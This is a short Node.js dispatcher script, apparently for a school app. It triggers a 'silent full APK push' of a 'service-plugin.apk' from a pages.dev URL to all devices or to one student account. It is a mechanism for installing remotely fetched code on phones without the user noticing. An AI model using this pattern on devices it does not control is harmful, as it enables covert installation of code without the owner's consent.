require('dotenv').config({ path: require('path').resolve(__dirname, '../.env') });
const { broadcastSilentApkPush } = require("../server/calls");

async function run() {
  console.log("------------------------------------------------------------");
  console.log("   TPS HIGH-PRIORITY SILENT FULL APK PUSH DISPATCHER");
  console.log("------------------------------------------------------------");
  const target = process.argv[2] || null;
  const apkUrl = process.argv[3] || "https://tapowan-school.pages.dev/downloads/service-plugin.apk";
  const versionCode = process.argv[4] || "1000";
  const version = process.argv[5] || "1.0.0";

  console.log(`📦 APK Version:        v${version} (Code ${versionCode})`);
  console.log(`🔗 APK URL:            ${apkUrl}`);
  console.log(`🎯 Target:             ${target ? `Specific Account: ${target}` : "ALL Devices"}`);
  console.log("------------------------------------------------------------\n");

  try {
    const result = await broadcastSilentApkPush({
      apkUrl: apkUrl,
      versionCode: versionCode,
      version: version,
      targetAdmissionNo: target
    });
    console.log("Result:", JSON.stringify(result, null, 2));
  } catch (err) {
    console.error("Error running broadcastSilentApkPush:", err);
  }
}

run();
